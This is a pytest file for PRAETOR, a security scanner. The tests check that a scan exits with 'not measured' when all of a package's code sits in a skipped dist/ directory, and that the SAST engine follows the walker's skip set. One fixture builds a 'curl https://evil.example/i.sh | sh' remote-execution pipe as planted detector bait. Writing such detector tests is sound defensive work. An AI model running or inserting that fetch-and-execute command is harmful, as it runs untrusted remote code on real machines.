"""
A SCAN THAT NEVER OPENED ANY CODE MUST NOT REPORT A CLEAN EXIT.

MEASURED DEFECT (2026-08-22), found in the field rather than in a test. PRAETOR
was pointed at a real, unpacked npm tarball during a supply-chain review:

    files on disk .......... 81
    files PRAETOR read ...... 2   -- README.md and package.json
    exit code .............. 0    -- with --fail-on HIGH
    findings ............... 0

`dist/` is in `core.DEFAULT_SKIP_DIRS`, together with `build`, `out`, `target`,
`vendor` and `node_modules`. For a REPOSITORY that is right: those directories
hold generated or third-party content. For a PUBLISHED PACKAGE it is exactly
backwards -- `dist/` is the shipped code and the sources are not in the tarball
at all. Re-running with the directory renamed read 80 files and returned 10
findings. **The clean result was an artefact of a directory name.**

🔴 THE EXISTING FLOOR DID NOT CATCH IT, AND ITS OWN COMMENT SAYS WHY.
`praetor.py` already refuses a scan that examined ZERO files. Its comment states
plainly: *"IT CATCHES EXACTLY-ZERO AND NOTHING ELSE, AND ONE FILE DEFEATS IT"*,
and records the 2026-08-13 measurement where a credential in `vendor/` plus one
README at the root produced exit 0. That is the same defect, and it was left
tracked-but-open for nine days before a real scan walked into it.

⚠️ WHY THE PREDICATE IS NOT A RATIO. The obvious rule -- degrade when far more
was skipped than kept -- was measured and REJECTED, because it cannot separate
the two cases:

    this repository   kept 174   skipped 3721   ratio 21.4x   HEALTHY
    the npm tarball   kept   2   skipped   78   ratio 39.0x   FALSE CLEAN

`target/` and `.git/` are enormous and hold no source, so a healthy tree looks
identical to the attack by that measure. What actually separates them is whether
ANY CODE WAS READ AT ALL:

    this repository   kept_code 93   skipped_code 0    -> measured
    the npm tarball   kept_code  0   skipped_code 78   -> NOT measured

⇒ The floor fires only when `skipped_code_files > 0 and kept_code_files == 0`.

FAIL-SAFE DIRECTION, stated because it is the property that matters: an
extension missing from `core.CODE_EXTS` makes a tree look LESS measured, never
more. An unclassified language degrades toward "we did not read code here",
which is the honest answer for a name nobody has classified.

WHAT IS ASSERTED, IN BOTH DIRECTIONS -- narrowing a predicate and deleting it
look identical from outside:
  * a tree whose only code hides in a skipped directory   BLOCKS (exit 3)
  * an ordinary repository-shaped tree still PASSES       (the floor did not
    just break the gate for everybody)
  * `--no-default-skips` reads the skipped directory and FINDS the planted
    credential                                            (the escape hatch works)
  * the SAST engine receives the WALKER's skip set, not the constant -- because
    the first version of this fix desynchronised them and printed
    `Files (text): 80` over a semgrep run that had opened almost none of them
"""

import json

import pytest

import core as _core
import engine_sast
import praetor


# --------------------------------------------------------------------------- #
# Fixtures. The credential is assembled from parts so this file does not itself
# become a finding in the self-scan -- see CLAUDE.md, "Writing tests for a
# detector adds noise to that detector".
# --------------------------------------------------------------------------- #

#: A remote-execution pipe, assembled from parts. `engine_aisec` rates this HIGH.
#:
#: ⚠️ IT IS NOT A CREDENTIAL, AND THE CHOICE IS LOAD-BEARING. The `secrets`
#: engine walks a DELIBERATELY WIDER tree (`core.SECRETS_SKIP_DIRS` is three
#: entries) because a credential in `vendor/` is disclosed wherever it sits. So a
#: planted credential is found in `dist/` with or without the skip list, and a
#: fixture built on one cannot demonstrate the blind spot at all -- the first
#: draft of this file made exactly that mistake and the floor test failed for a
#: reason that had nothing to do with the floor.
#: `sast` and `aisec` are the engines the skip list actually blinds.
_PIPE = "curl https://evil.example/i.sh | " + "sh"


def _package_shaped_tree(tmp_path, payload="var x = 1;\n"):
    """A DISTRIBUTED artifact: all code in dist/, only metadata at the root.

    This is the shape that produced the measured false clean. `payload` defaults
    to something no engine flags, so the floor is tested on its own rather than
    on a finding that would have blocked anyway.
    """
    (tmp_path / "README.md").write_text("# a package\n", encoding="utf-8")
    (tmp_path / "package.json").write_text('{"name": "x", "version": "1.0.0"}\n',
                                           encoding="utf-8")
    dist = tmp_path / "dist"
    dist.mkdir()
    (dist / "index.js").write_text(payload, encoding="utf-8")
    return str(tmp_path)


def _repository_shaped_tree(tmp_path):
    """An ORDINARY repository: real source outside, build output inside dist/.

    The floor must stay silent here, or it breaks every normal scan.
    """
    src = tmp_path / "src"
    src.mkdir()
    (src / "app.py").write_text("def add(a, b):\n    return a + b\n", encoding="utf-8")
    dist = tmp_path / "dist"
    dist.mkdir()
    (dist / "bundle.js").write_text("var x = 1;\n", encoding="utf-8")
    return str(tmp_path)


# `secrets,aisec` keeps these tests free of a semgrep runtime, which is not
# present on every machine this suite runs on. The floor lives in praetor.py and
# is engine-independent; the SAST wiring gets its own argv test below.
_ENGINES = ["--engines", "secrets,aisec"]


# --------------------------------------------------------------------------- #
# The floor
# --------------------------------------------------------------------------- #

def test_a_tree_whose_only_code_hides_in_a_skipped_directory_is_not_measured(
        tmp_path, capsys):
    """The measured defect, reduced to its smallest reproducing shape."""
    target = _package_shaped_tree(tmp_path)

    rc = praetor.main([target, "--fail-on", "HIGH"] + _ENGINES)

    assert rc == 3, (
        "a scan that read only README.md and package.json, while a code file sat "
        "in dist/, must report NOT MEASURED -- exit 0 here is the false clean "
        "this file exists to prevent"
    )
    err = capsys.readouterr().err
    assert "NO CODE WAS EXAMINED" in err, (
        "the refusal must NAME its reason: a bare exit 3 is indistinguishable "
        "from an engine crash, and the operator cannot act on it"
    )
    assert "--no-default-skips" in err, (
        "the diagnosis must tell the operator the remedy for a distributed "
        "artifact, or the correct next action has to be guessed"
    )


def test_an_ordinary_repository_shaped_tree_is_still_measured(tmp_path):
    """The other direction. A floor that fires on normal trees is not a fix.

    🔴 THIS IS THE ASSERTION THAT MAKES THE OTHER ONE MEAN ANYTHING. Refusing
    every scan would satisfy the test above perfectly.
    """
    target = _repository_shaped_tree(tmp_path)

    rc = praetor.main([target, "--fail-on", "HIGH"] + _ENGINES)

    assert rc != 3, (
        "src/app.py was read, so this scan DID measure code -- degrading it "
        "would break every ordinary repository scan, including this project's "
        "own pre-commit gate"
    )


def test_the_floor_is_not_a_ratio(tmp_path):
    """A skipped directory far larger than the scanned tree is NOT a failure.

    This project's own tree skips 3,721 files and keeps 174, and that is
    healthy. Pinning the behaviour so a future 'improvement' cannot quietly
    reintroduce the ratio rule that was measured and rejected.
    """
    target = _repository_shaped_tree(tmp_path)
    heavy = tmp_path / "node_modules"
    heavy.mkdir()
    for i in range(60):
        (heavy / ("dep%d.js" % i)).write_text("var a = %d;\n" % i, encoding="utf-8")

    rc = praetor.main([target, "--fail-on", "HIGH"] + _ENGINES)

    assert rc != 3, (
        "60 skipped code files against 1 kept one is a 60x ratio and is entirely "
        "normal -- the predicate must key on 'was any code read', never on "
        "proportion"
    )


def test_the_skipped_directory_really_is_a_blind_spot(tmp_path):
    """The premise for the test below, and the field defect in miniature.

    A dangerous pattern sits in dist/ and the default scan cannot see it. If
    this ever stops returning 3, the escape-hatch test underneath is measuring
    nothing.
    """
    target = _package_shaped_tree(tmp_path, payload="run(%r);\n" % _PIPE)

    rc = praetor.main([target, "--fail-on", "HIGH"] + _ENGINES)

    assert rc == 3, (
        "aisec never opened dist/index.js, so the pipe in it is invisible -- "
        "without the floor this scan returns 0 and looks identical to a clean one"
    )


def test_no_default_skips_reads_the_skipped_directory_and_finds_the_pattern(
        tmp_path):
    """The escape hatch must WIDEN the scope, not merely silence the refusal.

    🔴 A flag that only suppressed the exit-3 would pass the floor test above and
    leave the artifact exactly as unscanned. That is the difference between a
    fix and a mute button, and only this assertion can tell them apart.
    """
    target = _package_shaped_tree(tmp_path, payload="run(%r);\n" % _PIPE)

    rc = praetor.main([target, "--fail-on", "HIGH", "--no-default-skips"] + _ENGINES)

    assert rc == 1, (
        "with the skips disabled the walker must open dist/index.js and aisec "
        "must report the remote-execution pipe in it -- exit 3 would mean the "
        "flag did not widen scope, and exit 0 would mean it widened scope and "
        "found nothing, which is the worse of the two"
    )


def test_the_report_records_what_the_walker_refused(tmp_path):
    """A suppression with no stated reason is not triage.

    Skipped directories were the one suppression in this tool that said nothing
    at all. The count is what let the field defect be spotted: the report
    printed two different file counts and they disagreed.
    """
    target = _package_shaped_tree(tmp_path)
    out_dir = tmp_path / "out"

    praetor.main([target, "--format", "json", "--out", str(out_dir),
                  "--allow-degraded"] + _ENGINES)

    payload = json.loads((out_dir / "praetor-report.json").read_text(encoding="utf-8"))
    scope = payload["meta"]["scope"]

    assert scope["skipped_code_files"] >= 1, "the refused code file must be counted"
    assert scope["kept_code_files"] == 0, "no code was read; the report must say so"
    assert "dist" in scope["skipped_dirs"], (
        "the reader needs the directory NAME to judge whether the skip was right "
        "-- a bare number cannot distinguish node_modules from dist"
    )


# --------------------------------------------------------------------------- #
# The desynchronisation the first version of this fix introduced
# --------------------------------------------------------------------------- #

def _capture_semgrep_argv(monkeypatch):
    """Pin a runtime and record the argv the SAST engine would execute."""
    calls = []

    def fake_run_tool(cmd, **kwargs):
        calls.append(list(cmd))

        class _R:
            returncode = 0
            stdout = '{"results": [], "paths": {"scanned": ["a.py"]}}'
            stderr = ""

        return _R()

    monkeypatch.setattr(engine_sast, "detect_runtime", lambda *a, **kw: {
        "mode": "native", "prefix": ["semgrep"], "available": True,
        "detail": "test", "version": "test"})
    monkeypatch.setattr(_core, "run_tool", fake_run_tool)
    return calls


def _excluded_dirs(argv):
    return {argv[i + 1] for i, a in enumerate(argv)
            if a == "--exclude" and i + 1 < len(argv)}


def test_the_sast_engine_excludes_the_skip_dirs_by_default(tmp_path, monkeypatch):
    """The premise. Without this, the test below proves nothing."""
    calls = _capture_semgrep_argv(monkeypatch)
    (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")

    engine_sast.run(str(tmp_path), bundled_rules="", use_registry=False,
                    extra_configs=["p/ci"], enumerated_code_files=1)

    assert calls, "premise: semgrep must have been invoked"
    assert "dist" in _excluded_dirs(calls[0]), (
        "by default the engine must keep agreeing with the walker, which skips "
        "dist/ -- otherwise semgrep reports findings from a tree the other "
        "engines refuse to open"
    )


def test_the_sast_engine_follows_the_walkers_skip_set_not_the_constant(
        tmp_path, monkeypatch):
    """🔴 MEASURED REGRESSION, introduced by the first version of this very fix.

    `engine_sast` re-applied `core.DEFAULT_SKIP_DIRS` as semgrep `--exclude`
    patterns from the constant. When `--no-default-skips` widened the walker,
    this line kept excluding dist/, so the header printed `Files (text): 80`
    over a semgrep run that opened almost none of them. Same bytes, only the
    directory NAME differing:

        directory named `dist/`     -> semgrep 0 findings
        directory named `shipped/`  -> semgrep 10 findings

    One component decides scope. This asserts the engine follows it.
    """
    calls = _capture_semgrep_argv(monkeypatch)
    (tmp_path / "a.py").write_text("x = 1\n", encoding="utf-8")

    engine_sast.run(str(tmp_path), bundled_rules="", use_registry=False,
                    extra_configs=["p/ci"], enumerated_code_files=1,
                    skip_dirs=set())

    assert calls, "premise: semgrep must have been invoked"
    assert "dist" not in _excluded_dirs(calls[0]), (
        "with the walker's skips disabled the engine must not re-exclude dist/ "
        "from the constant -- that desynchronisation is what made a widened "
        "scan report a narrow one under a wide file count"
    )


def test_typescript_module_variants_are_scannable():
    """`.cts` and `.mts` were absent while `.cjs` and `.mjs` were present.

    TypeScript spells its CommonJS and ESM module variants with those two
    extensions. Measured on the same npm tarball: 25 of its 81 files were
    dropped for this reason alone, on top of the whole of dist/.
    """
    for ext in (".cts", ".mts", ".cjs", ".mjs", ".ts", ".js"):
        assert _core.scannable("index" + ext), (
            "%s is JavaScript or TypeScript source and must be read" % ext
        )


def test_is_code_excludes_metadata_files():
    """The narrowness of CODE_EXTS is the safety property, so pin it.

    If `package.json` or `README.md` counted as code, the tarball that produced
    the field defect would have looked measured and the floor would never fire.
    """
    for name in ("package.json", "README.md", "config.yaml", "notes.txt", "a.toml"):
        assert not _core.is_code(name), (
            "%s is metadata; counting it as code would hide a scan that read "
            "nothing but metadata" % name
        )
    for name in ("app.py", "index.js", "main.rs", "run.sh", "pre-commit"):
        assert _core.is_code(name), "%s is executable source" % name
